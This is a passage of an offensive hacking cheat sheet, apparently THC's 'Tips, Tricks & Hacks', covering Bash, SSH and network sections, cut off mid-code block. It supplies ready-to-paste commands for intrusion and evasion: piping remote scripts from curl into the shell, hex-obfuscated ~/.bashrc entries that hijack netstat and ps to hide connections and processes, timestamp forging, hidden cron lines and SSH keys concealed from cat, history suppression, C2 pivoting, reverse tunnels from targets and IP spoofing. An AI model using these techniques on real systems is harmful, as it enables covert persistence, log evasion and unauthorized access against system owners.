<!-- Use `grip 8080` to render the markdown locally -->
# THC's favourite Tips, Tricks & Hacks (Cheat Sheet)

https://thc.org/tips  

A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.

We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.

Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)

1. [Bash](#bash)
   1. [Set up a Hack Shell](#hackshell)
   1. [Hide your commands](#bash-hide-command)
   1. [Hide your command line options](#zap)
   1. [Hide a network connection](#bash-hide-connection)
   1. [Hide a process as user](#hide-a-process-user)
   1. [Hide a process as root](#hide-a-process-root)
   1. [Hide scripts](#hide-scripts)
   1. [Hide from cat](#cat)
   1. [Execute in parallel with separate logfiles](#parallel)
1. [SSH](#ssh)
   1. [Almost invisible SSH](#ssh-invisible)
   1. [Multiple shells via 1 SSH/TCP connection](#ssh-master)
   1. [SSH tunnel](#ssh-tunnel)
   1. [SSH socks5 tunnel](#ssh-socks-tunnel)
   1. [SSH to NATed host](#ssh-j)
   1. [SSH pivot via ProxyJump](#ssh-pj)
   1. [SSHD as user](#sshd-user)
1. [Network](#network)
   1. [Discover hosts](#discover)
   1. [Tcpdump](#tcpdump)
   1. [Tunnel and forwarding](#tunnel)
      1. [Raw TCP reverse ports](#ports)
      1. [HTTPS reverse forwards](#https)
      2. [Bouncing traffic with iptables](#iptables)
      3. [Ghost IP / IP Spoofing](#ghost)
      4. [Various](#tunnel-more)
   1. [Use any tool via Socks Proxy](#scan-proxy)
   1. [Find your public IP address](#your-ip)
   1. [Check reachability from around the world](#check-reachable)
   1. [Check/Scan Open Ports](#check-open-ports)
   1. [Crack Passwords hashes](#bruteforce)
   1. [Brute Force Passwords / Keys](#bruteforce)
1. [Data Upload/Download/Exfil](#exfil)
   1. [File Encoding/Decoding](#file-encoding)
   1. [File transfer using cut & paste](#cut-paste)
   1. [File transfer using tmux](#xfer-tmux)
   1. [File transfer using screen](#file-transfer-screen)
   1. [File transfer using gs-netcat and sftp](#file-transfer-gs-netcat)
   1. [File transfer using HTTP](#http)
   1. [File download without curl](#download)
   2. [File transfer using rsync](#rsync)
   1. [File transfer to public dump sites](#trans) 
   1. [File transfer using WebDAV](#webdav)
   1. [File transfer to Telegram](#tg) 
1. [Reverse Shell / Dumb Shell](#reverse-shell)
   1. [Reverse Shells](#reverse-shell)
      1. [with gs-netcat (encrypted)](#reverse-shell-gs-netcat)
      1. [with Bash](#reverse-shell-bash)
      2. [with cURL (encrypted)](#curlshell)
      2. [with cURL (cleartext)](#curltelnet)
      3. [with OpenSSL (encrypted)](#sslshell)
      1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
      1. [without /dev/tcp](#reverse-shell-no-bash)
      1. [with Python](#reverse-shell-python)
      1. [with Perl](#reverse-shell-perl)
      1. [with PHP](#reverse-shell-php)
   1. [Upgrading the dumb shell](#reverse-shell-upgrade)
      1. [Upgrade a reverse shell to a pty shell](#reverse-shell-pty)
      1. [Upgrade a reverse shell to a fully interactive shell](#reverse-shell-interactive)
      1. [Reverse shell with socat (fully interactive)](#reverse-shell-socat)
1. [Backdoors](#backdoor)
   1. [gs-netcat](#gsnc)
   2. [sshx.io](#sshx)
   1. [Smallest SSHD backdoor](#backdoor-sshd)
   1. [Remote access an entire network](#backdoor-network)
   1. [Smallest PHP backdoor](#php-backdoor)
   1. [Smallest reverse DNS-tunnel backdoor](#reverse-dns-backdoor)
   1. [Local Root backdoor](#ld-backdoor)
   1. [Self-extracting implant](#implant)
1. [Host Recon](#hostrecon)
1. [Shell Hacks](#shell-hacks)
   1. [Shred files (secure delete)](#shred)
   1. [Restore the date of a file](#restore-timestamp)
   1. [Clean logfile](#shell-clean-logs)
   1. [Hide files from a User without root privileges](#shell-hide-files)
   1. [Make a file immutable](#perm-files)
   1. [Change user without sudo/su](#nosudo)
   1. [Obfuscate and crypt payload](#payload)
   1. [Deploying a backdoor without touching the file-system](#memexec)
1. [Crypto](#crypto)
   1. [Generate quick random Password](#gen-password)
   1. [Linux transportable encrypted filesystems](#crypto-filesystem)
      1. [cryptsetup](#crypto-filesystem)
      1. [EncFS](#encfs)
   1. [Encrypting a file](#encrypting-file)
1. [Session sniffing and hijacking](#sniffing)
   1. [Sniff a user's SHELL session](#session-sniffing)
   2. [Sniff all SHELL sessions with dtrace](#dtrace)
   2. [Sniff all SHELL sessions with eBPF](#bpf)
   1. [Sniff a user's SSH or SSHD session with strace](#ssh-sniffing-strace)
   1. [Sniff a user's outgoing SSH session with a wrapper script](#ssh-sniffing-wrapper)
   1. [Sniff a user's outgoing SSH session with SSH-IT](#ssh-sniffing-sshit)
   1. [Hijack / Take-over a running SSH session](#hijack)
1. [VPN and Shells](#vpn-shell)
   1. [Disposable Root Servers](#shell)
   1. [VPN/VPS Providers](#vpn)
1. [OSINT Intelligence Gathering](#osint)
1. [Miscellaneous](#misc)
   1. [Tools of the trade](#tools)
   1. [Cool Linux commands](#cool-linux-commands)
   1. [tmux Cheat Sheet](#tmux)
   1. [Useful commands](#useful-commands)
1. [How to become a Hacker](#hacker)
1. [Other Sites](#others)

---
<a id="bash"></a>
## 1. Bash / Shell
<a id="hackshell"></a>
**1.i. Set up a Hack Shell (bash):**

Make BASH less noisy. Disables *~/.bash_history* and [many other things](https://github.com/hackerschoice/hackshell).
```sh
 source <(curl -SsfL https://thc.org/hs)
```
Alternative URL:
```sh
 source <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
```

And if there is no curl/wget, use [surl](#download) and (temporarily) installed curl with `bin curl`.
```sh
source <(surl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh)
# Afterwards type `bin curl` to (temporarily) install curl (in memory).
```

HackShell does much more but most importantly this:
```sh
unset HISTFILE
[ -n "$BASH" ] && export HISTFILE="/dev/null"
export BASH_HISTORY="/dev/null"
export LANG=en_US.UTF-8
locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
export LESSHISTFILE=-
export REDISCLI_HISTFILE=/dev/null
export MYSQL_HISTFILE=/dev/null
TMPDIR="/tmp"
[ -d "/var/tmp" ] && TMPDIR="/var/tmp"
[ -d "/dev/shm" ] && TMPDIR="/dev/shm"
export TMPDIR
export PATH=".:${PATH}"
if [[ "$SHELL" == *"zsh" ]]; then
    PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
else
    PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
fi
alias wget='wget --no-hsts'
alias vi="vi -i NONE"
alias vim="vim -i NONE"
alias screen="screen -ln"

TERM=xterm reset -I
stty cols 400 # paste this on its own before pasting the next line:
resize &>/dev/null || { stty -echo;printf "\e[18t"; read -t5 -rdt R;IFS=';' read -r -a a <<< "${R:-8;25;80}";[ "${a[1]}" -ge "${a[2]}" ] && { R="${a[1]}";a[1]="${a[2]}";a[2]="${R}";};stty sane rows "${a[1]}" cols "${a[2]}";}
# stty sane rows 60 cols 160
```

We use `anew` a lot, and this is a quick workaround:
```shell
xanew() { awk 'hit[$0]==0 {hit[$0]=1; print $0}'; }
which anew &>/dev/null || alias anew=xanew
```

Bonus tip:
Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
```
$  id
```

<a id="bash-hide-command"></a>
**1.ii. Hide your command / Daemonzie your command**

This will hide the *process name* only. Use [zapper](#zap) to also hide the command line options.

```shell
(exec -a syslogd nmap -Pn -F -n --open -oG - 10.0.2.1/24) # Note the brackets '(' and ')'
```

Start a background 'nmap' hidden as '/usr/sbin/sshd':
```
(exec -a '/usr/sbin/sshd' nmap -Pn -F -n --open -oG - 10.0.2.1/24 &>nmap.log &)
```

Start within a [GNU screen](https://linux.die.net/man/1/screen):
```
screen -dmS MyName nmap -Pn -F -n --open -oG - 10.0.2.1/24
### Attach back to the nmap process
screen -x MyName
```

Alternatively, copy the binary to a new name:
```sh
cd /dev/shm
cp "$(command -v nmap)" syslogd
PATH=.:$PATH syslogd -Pn -F -n --open -oG - 10.0.2.1/24
```

or use bind-mount to (temporarily) let */sbin/init* point to */dev/shm/nmap* instead:
```shell
mount -n --bind "$(command -v nmap)" /sbin/init
# starting /sbin/init will instead execute nmap
(/sbin/init -Pn -f -n --open -oG - 10.0.2.1/24 &>nmap.log &)
```

<a id="zap"></a>
**1.iii. Hide your command line options**

Use [zapper](https://github.com/hackerschoice/zapper):
```sh
curl -fL -o zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m) && \
chmod 755 zapper
```

```sh
# Start Nmap but zap all options and show it as 'klog' in the process list:
./zapper -a klog nmap -Pn -F -n --open -oG - 10.0.0.1/24
# Started as a daemon and sshd-style name:
(./zapper -a 'sshd: root@pts/0' nmap -Pn -F -n --open -oG - 10.0.0.1/24 &>nmap.log &)
# Replace the existing shell with tmux (with 'exec').
# Then start and hide tmux and all further processes - as some kernel process:
exec ./zapper -f -a'[kworker/1:0-rcu_gp]' tmux
```

<a id="bash-hide-connection"></a>
**1.iv. Hide a Network Connection**

The trick is to hijack `netstat` and use grep to filter out our connection. This example filters any connection on port 31337 _or_ ip 1.2.3.4. The same should be done for `ss` (a netstat alternative).

**Method 1 - Hiding a connection with bash-function in ~/.bashrc**

Cut & paste this to add the line to ~/.bashrc
```shell
echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

Or cut & paste this for an obfuscated entry to ~/.bashrc:
```shell
X='netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }'
echo "eval \$(echo $(echo "$X" | xxd -ps -c1024)|xxd -r -ps) #Initialize PRNG" >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

The obfuscated entry to ~/.bashrc will look like this:
```
eval $(echo 6e65747374617428297b20636f6d6d616e64206e6574737461742022244022207c2067726570202d4676202d65203a3331333337202d6520312e322e332e343b207d0a|xxd -r -ps) #Initialize PRNG
```

**Method 2 - Hiding a connection with a binary in $PATH**

Create a fake netstat binary in /usr/local/sbin. On a default Debian (and most Linux) the PATH variables (`echo $PATH`) lists /usr/local/sbin _before_ /usr/bin. This means that our hijacking binary /usr/local/sbin/netstat will be executed instead of /usr/bin/netstat.

```shell
echo '#! /bin/bash
exec /usr/bin/netstat "$@" | grep -Fv -e :22 -e 1.2.3.4' >/usr/local/sbin/netstat \
&& chmod 755 /usr/local/sbin/netstat \
&& touch -r /usr/bin/netstat /usr/local/sbin/netstat
```

*(thank you iamaskid)*

<a id="hide-a-process-user"></a>
**1.v. Hide a process as user**

Continuing from "Hiding a connection" the same technique can be used to hide a process. This example hides the nmap process and also takes care that our `grep` does not show up in the process list by renaming it to GREP:

```shell
echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
&& touch -r /etc/passwd ~/.bashrc
```

<a id="hide-a-process-root"></a>
**1.vi. Hide a process as root**

This requires root privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
```sh
hide() {
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

To hide a command use:
```sh
hide                                 # Hides the current shell/PID
hide 31337                           # Hides process with pid 31337
hide sleep 1234                      # Hides 'sleep 1234'
hide nohup sleep 1234 &>/dev/null &  # Starts and hides 'sleep 1234' as a background process
```

(thanks to *druichi* for improving this)

<a id="hide-scripts"></a>
**1.vii. Hide shell scripts**

Above we discussed how to obfuscate a line in ~/.bashrc. An often used trick is to use `source` instead. The source command can be shortened to `.` (yes, a dot) _and_ it also searches through the $PATH variable to find the file to load.

In this example our script ```prng``` contains all of our shell functions from above. Those functions hide the `nmap` process and the network connection. Last we add `. prng` into the systemwide rc file. This will load `prng` when the user (and root) logs in:

```shell
echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }
ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prng \
&& echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
&& touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
```

(The same works for `lsof`, `ss` and `ls`)

<a id="cat"></a>
**1.viii. Hide from cat**

ANSI escape characters or a simple `\r` ([carriage return](https://www.hahwul.com/2019/01/23/php-hidden-webshell-with-carriage/)) can be used to hide from `cat` and others.

Hide the last command (example: `id`) in `~/.bashrc`:
```sh
echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
### The ANSI escape sequence \\033[2K erases the line. The next sequence \\033[1A
### moves the cursor 1 line up.
### The '#' after the command 'id' is a comment and is needed so that bash still
### executes the 'id' but ignores the two ANSI escape sequences.
```

Add a hidden crontab line:
```sh
(crontab -l; echo -e "0 2 * * * { id; date;} 2>/dev/null >/tmp/.thc-was-here #\\033[2K\\033[1A") | crontab
```

Adding a `\r` (carriage return) goes a long way to hide your ssh key from `cat`:
```shell
echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >authorized_keys
### This adds our key as the first key and 'cat authorized_keys' won't show
### it. The $'\r' is a bash special to create a \r (carriage return).
```

<a id="parallel"></a>
**1.ix. Execute in parallel with separate logfiles***

Note: The same can be achieved with [parallel](https://www.gnu.org/software/parallel/parallel_tutorial.html).

Scan hosts with 20 parallel tasks:
```sh
cat hosts.txt | xargs -P20 -I{} --process-slot-var=SLOT bash -c 'exec nmap -n -Pn -sV -F --open -oG - {} >>"nmap_${SLOT}.txt"'
```
- `exec` is used to replace the underlying shell with the last process (nmap). It's optional but reduces the number of running/useless shell binaries.
- `${SLOT}` contains a value between 0..19. It's the "task number". We use it to write the nmap-results into 20 separate files.

Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
```sh
cat secrets.txt | xargs -P40 -I{} --process-slot-var=SLOT bash -c 'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
```
- Log each result into a separate file but log all errors into a error-log file by task-number.

---
<a id="ssh"></a>
## 2. SSH
<a id="ssh-invisible"></a>
**2.i. Almost invisible SSH**

Stops you from showing up in *w* or *who* command and stops logging the host to *~/.ssh/known_hosts*.
```sh
ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
```

Go full comfort with PTY and colors: `xssh user@server.org`:

```sh
### Cut & Paste the following to your shell, then execute
### xssh user@server.org
xssh() {
    local ttyp="$(stty -g)"
    echo -e "\e[0;35mTHC says: pimp up your prompt: Cut & Paste the following into your remote shell:\e[0;36m"
    echo -e '\e[0;36msource <(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)\e[0m'
    echo -e "\e[2m# or: \e[0;36m\e[2mPS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\]\\$ '"'\e[0m"
    stty raw -echo icrnl opost
    [[ $(ssh -V 2>&1) == OpenSSH_[67]* ]] && a="no"
    ssh -oConnectTimeout=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking="${a:-accept-new}" -T \
        "$@" \
        "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [uid] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
    stty "${ttyp}"
}
```
(See [Hackshell](https://github.com/hackerschoice/hackshell))

<a id="ssh-master"></a>
**2.ii Multiple shells via 1 SSH/TCP connection**

Have one TCP connection to the target and allow multiple users to piggyback on the same TCP connection to open further shell sessions.

Create a Master Connection:
```sh
ssh -M -S .sshmux user@server.org
```

Create further shell-sessions using the same (single) Master-TCP connection from above (no password/auth needed):
```sh
ssh -S .sshmux NONE
#ssh -S .sshmux NONE ls -al
#scp -o "ControlPath=.sshmux" NONE:/etc/passwd .
```
Can be combined with [xssh](#ssh-invisible) to hide from utmp.

<a id="ssh-tunnel"></a>
**2.iii SSH tunnel**

We use this all the time to circumvent local firewalls and IP filtering:
```sh
ssh -g -L31337:1.2.3.4:80 user@server.org
```
You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

Clever hackers use the keyboard combination `~C` to dynamically create these tunnels without having to reconnect the SSH. (thanks MessedeDegod).

We use this to give access to a friend to an internal machine that is not on the public Internet:
```sh
ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
```
Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

<a id="ssh-socks-tunnel"></a>
**2.iv SSH socks4/5 tunnel**

OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.

```sh
ssh -D 1080 user@server.org
```
Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *server.org* and will appear with the source IP of *server.org*. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

This is the reverse of the above example. It give others access to your *local* network or let others use your computer as a tunnel end-point.

```sh
ssh -g -R 1080 user@server.org
```

The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](#backdoor-network).

<a id="ssh-j"></a>
**2.v SSH to a host behind NAT**

[ssh-j.com](http://ssh-j.com) provides a great relay service: To access a host behind NAT/Firewall (via SSH).

On the host behind NAT: Create a reverse SSH tunnel to [ssh-j.com](http://ssh-j.com) like so:
```sh
## Cut & Paste on the host behind NAT.
sshj()
{
   local pw
   pw=${1,,}
   [[ -z $pw ]] && { pw=$(head -c64 </dev/urandom | base64 | tr -d -c a-z0-9); pw=${pw:0:12}; }
   echo "Press Ctrl-C to stop this tunnel."
   echo -e "To ssh to ${USER:-root}@${2:-127.0.0.1}:${3:-22} type: \e[0;36mssh -J ${pw}@ssh-j.com ${USER:-root}@${pw}\e[0m"
   ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes ${pw}@ssh-j.com -N -R ${pw}:22:${2:-0}:${3:-22}
}

sshj                                 # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected
sshj foobarblahblub                  # Creates tunnel to 127.0.0.1:22 with specific tunnel ID
sshj foobarblahblub 192.168.0.1 2222 # Tunnel to host 192.168.0.1:2222 on the LAN
```

Then use this command from anywhere else in the world to connect as 'root' to 'foobarblahblub' (the host behind the NAT):
```sh
ssh -J foobarblahblub@ssh-j.com root@foobarblahblub
```
The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind NAT. The traffic is end-2-end encrypted and ssh-j.com can not see the content.


<a id="ssh-pj"></a>
**2.vi SSH pivoting to multiple servers**

SSH ProxyJump can save you a lot of time and hassle when working with remote servers. Let's assume the scenario:  

Our workstation is $local-kali and we like to SSH into $target-host. There is no direct connection between our workstation and $target-host. Our workstation can only reach $C2. $C2 can reach $internal-jumphost (via internal eth1) and $internal-jumphost can reach the final $target-host via eth2.
```sh
          $local-kali       -> $C2            -> $internal-jumphost    -> $target-host
eth0      192.168.8.160      10.25.237.119             
eth1                         192.168.5.130       192.168.5.135
eth2                                             172.16.2.120             172.16.2.121
```

> We do not execute `ssh` on any computer but our trusted workstation - and neither shall you (ever).

That's where ProxyJump helps: We can 'jump' via the two intermediary servers $C2 and $internal-jumphost (without spawning a shell on those servers). The ssh-connection is end-2-end encrypted between our $local-kali and $target-host and no password or key is exposed to $C2 or $internal-jumphost.

```sh 
## if we want to SSH to $target-host:
kali@local-kali$ ssh -J c2@10.25.237.119,jumpuser@192.168.5.135 target@172.16.2.121

## if we want to SSH to just $internal-jumphost:
kali@local-kali$ ssh -J c2@10.25.237.119 jumpuser@192.168.5.135
```

> We use this as well to hide our IP address when logging into servers. 

<a id="sshd-user"></a>
**2.vii SSHD as user land**

It is possible to start a SSHD server as a non-root user and use this to multiplex or forward TCP connection (without logging and when the systemwide SSHD forbids forwarding/multiplexing) or as a quick exfil-dump-server that runs as non-root:
```sh
# On the server, as non-root user 'joe':
mkdir -p ~/.ssh 2>/dev/null
ssh-keygen -q -N "" -t ed25519 -f sshd_key
cat sshd_key.pub >>~/.ssh/authorized_keys
cat sshd_key
$(command -v sshd) -f /dev/null -o HostKey=$(pwd)/sshd_key -o GatewayPorts=yes -p 31337 # -Dvvv
```
```sh
# On the client, copy the sshd_key from the server. Then login:
# Example: Proxy connection via the server and reverse-forward 31339 to localhost:
ssh -D1080 -R31339:0:31339 -i sshd_key -p 31337 joe@1.2.3.4
# curl -x socks5h://0 ipinfo.io
```

[SSF](https://securesocketfunneling.github.io/ssf/#home) is an alternative way to multiplex TCP over TLS.

---
<a id="network"></a>
## 3. Network
<a id="discover"></a>
**3.i. Discover hosts**

```sh
## ARP discover computers on the _LOCAL_ network only
nmap -n -sn -PR -oG - 192.168.0.1/24
```

```sh
### ICMP discover hosts
nmap -n -sn -PI -oG - 192.168.0.1/24
```

```sh
## ICMP discover hosts (local LAN) ROOT
# NET="10.11.0"  # discover 10.11.0.1-10.11.0.254
seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
```

---
<a id="tcpdump"></a>
**3.ii. tcpdump**

```sh
## Monitor every new TCP connection
tcpdump -np 'tcp[tcpflags] ^ (tcp-syn|tcp-ack) == 0'

## Play a *bing*-noise for every new SSH connection
tcpdump -nplq 'tcp[13] == 2 and dst port 22' | while read -r x; do echo "${x}"; echo -en \\a; done

## Ascii output (for all large packets. Change to >40 if no TCP options are used).
tcpdump -npAq -s0 'tcp and (ip[2:2] > 60)'
```

---
<a id="tunnel"></a>
**3.iii. Tunnel and forwarding**

```sh
## Connect to SSL (using socat)
socat stdio openssl-connect:smtp.gmail.com:465

## Connect to SSL (using openssl)
openssl s_client -connect smtp.gmail.com:465
```

```sh
## Bridge TCP to SSL
socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
```

---
<a id="ports"></a>
**3.iii.a Raw TCP reverse ports**

Useful for reverse backdoors that need a TCP Port on a PUBLIC IP Address:

Using [segfault.net](https://thc.org/segfault.net) (free):
```sh
# Request a random public TCP port:
curl sf/port
echo "Your public IP:PORT is $(cat /config/self/reverse_ip):$(cat /config/self/reverse_port)"
nc -vnlp $(cat /config/self/reverse_port)
```

Using [bore.pub](https://github.com/ekzhang/bore) (free):
```sh
# Forward a random public TCP port to localhost:31337
bore local 31337 --to bore.pub
```

using [serveo.net](https://serveo.net) (free):
```sh
# Forward a random public TCP port to localhost:31337
ssh -R 0:localhost:31337 tcp@serveo.net
```

using [pinggy.io](https://www.pinggy.io) (60 mins free):
```sh
ssh -p 443 -R 0:localhost:31337 tcp@a.pinggy.io
```

See also [remote.moe](#revese-shell-remote-moe) (free) to forward raw TCP from the target to your workstation or [playit](https://playit.gg/) (free) or [ngrok](https://ngrok.com/) (paid subscription) to forward a raw public TCP port.

Other free services are limited to forward HTTPS only (not raw TCP). Some tricks below show how to tunnel raw TCP over HTTPS forwards (using websockets).

---
<a id="https"></a>
**3.iii.b HTTPS reverse tunnels**

On the server, use any one of these three HTTPS tunneling services:  
```sh
### Reverse HTTPS tunnel to forward public HTTPS requests to this server's port 8080:
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@localhost.run
### Or using remote.moe
ssh -R80:0:8080 -o StrictHostKeyChecking=accept-new nokey@remote.moe
### Or using cloudflared
curl -fL -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod 755 cloudflared
cloudflared tunnel --url http://localhost:8080 --no-autoupdate
```
Either service will generate a new temporary HTTPS-URL for you to use.  

Then, use [websocat](https://github.com/vi/websocat) or [Gost](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) on both ends to tunnel raw TCP over the HTTPS URL:

A. A simple STDIN/STDOUT pipe via HTTPS:
```sh
### On the server convert WebSocket to raw TCP:
websocat -s 8080
```
```sh
### On the remote target forward stdin/stdout to WebSocket:
websocat wss://<HTTPS-URL>
```

B. Forward raw TCP via HTTPS:
```sh
### On the server: Gost will translate any HTTP-websocket request to a TCP socks5 request:
gost -L mws://:8080
```

Forward port 2222 to the server's port 22.
```sh
### On the workstation:
gost -L tcp://:2222/127.0.0.1:22 -F 'mwss://<HTTPS-URL>:443'
### Test the connection (will connect to localhost:22 on the server)
nc -vn 127.0.0.1 2222
```
or use the server as a Socks-Proxy EXIT node (e.g. access any host inside the server's network or even the Internet via the server (using the HTTPS reverse tunnel from above):
```sh
### On the workstation:
gost -L :1080 -F 'mwss://<HTTPS-URL>:443'
### Test the Socks-proxy:
curl -x socks5h://0 ipinfo.io
```

More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvesec/port-forwarding) and [Tunnel via Cloudflare to any TCP Service](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) and [Awesome Tunneling](https://github.com/anderspitman/awesome-tunneling).

---
<a id="iptables"></a>
**3.iii.c Bouncing traffic with iptables**

Bounce through a host/router without needing to run a userland proxy or forwarder:
```sh
bounceinit() {
    echo 1 >/proc/sys/net/ipv4/ip_forward
    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
    [ $# -le 0 ] && set -- "0.0.0.0/0"
    while [ $# -gt 0 ]; do
        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
        shift 1
    done
    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
}
bounce() {
    iptables -t nat -A PREROUTING -p tcp --dport "${1:?}" -m mark --mark 1188 -j DNAT --to ${2:?}:${3:?}
}
bounceinit                             # Allow EVERY IP to bounce
# bounceinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
```
(See [Hackshell](https://github.com/hackerschoice/hackshell) `bounce`)


Then set forwards like so:
```sh
bounce 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
bounce 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
bounce 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
```

We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
```sh
# Deploy on a target that can only reach 192.168.0.100  
GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh  
```
```sh
# Access the target  
GS_HOST=213.171.212.212 gs-netcat -i -s ...
```

---
<a id="ghost"></a>
**3.vi.c Ghost IP / IP Spoofing**

Useful on a host inside the target network. This tool re-configured (without trace) the SHELL: Any program (nmap, cme, ...) started from this SHELL will use a fake IP. All your attacks will originate from a host that does not exist.

```sh
source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
```

This also works in combination with:
 * [Segfault's ROOT Servers](https://thc.org/segfault/wireguard): Will connect your ROOT Server to the TARGET NETWORK and using a Ghost IP inside the target network.
 * [QEMU Tunnels](https://securelist.com/network-tunneling-with-qemu/111803/): As above, but less secure.

---
<a id="tunnel-more"></a>
**3.vi.d Various Tunnel Tricks**

### Tunnel via CDN
 * Read [How to tunnel any TCP service via CloudFlare](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) or use [DarkFlare](https://github.com/doxx/darkflare).

### Connect your host directly to the remote network
 * [WireTap](https://github.com/sandialabs/wiretap) - Works as user or root. Uses UDP as transport. ([Try it](https://thc.org/segfault/wireguard) on segfault.)
 * [ligolo-ng](https://github.com/nicocha30/ligolo-ng) - Uses TCP as transport. Works well via [cloudflare CDN](https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service) or gs-netcat.

### Use SSH as a cheap reverse proxy via Cloudflare

This method is similar to [HTTPS reverse tunnels](#https) but uses SSH instead of Gost or websocat.
- Advantage: Only uses *cloudflared* and *SSH* on the target.
- Disadvantage: Needs a CF subscription.

 1. Go to your CF Dashboard -> Zero Trust -> Networks -> Tunnels
 2. Create a new 'Cloudflared' tunnel of any name.
 3. Select Debian & 64-bit. The Token is not fully shown. Extract the "Token" by copying the grayed out area into a separate document to reveal the entire Token (the long hex-strings after `sudo cloudflared service install <TunnelTokenHere>`).
 4. Add a subdomain (example uses `ssh.team-teso.net`).
 5. Set Type=TCP URL=localhost:22

```shell
